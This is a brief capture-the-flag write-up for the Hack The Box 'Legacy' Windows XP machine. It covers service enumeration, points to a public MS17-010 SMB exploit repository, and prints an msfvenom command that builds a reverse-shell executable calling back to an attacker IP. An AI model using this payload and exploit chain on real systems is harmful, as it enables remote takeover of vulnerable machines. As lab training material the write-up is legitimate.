---
title: Legacy (Hack The Box Writeup)
date: 2021-09-05T14:00:00+08:00
draft: false
url: "/2021/09/05/legacy-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

> 
URL : https://app.hackthebox.eu/machines/2

IP : 10.10.10.4

## Info gathering

- nmap scan port![](/uploads/2022/02/b01ed-XUUOml1.png)enum4linux check version- ![](/uploads/2022/02/bbb86-94iDB0t.png)nmap check smb version- ![](/uploads/2022/02/97190-USUyLZ0.png)So… we know that- Domain name : `HTB`
- OS : `Windows XP`
- Open Services : `SMB`

## Find Exploit

- Google`XP SMB Exploit`
- https://github.com/helviojunior/MS17-010
- MS17-010Prepare reverse shell exe file- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7879 -f exe > shell_reverse_tcp`Run exploit- ![](/uploads/2022/02/4d4fe-C3wQcO3.png)Get reverse shell- ![](/uploads/2022/02/5982f-HYhpAYv.png)

## Flag

- Root Flag![](/uploads/2022/02/9320a-9eqbJAU.png)User Flag- ![](/uploads/2022/02/cce4d-5db36Pf.png)
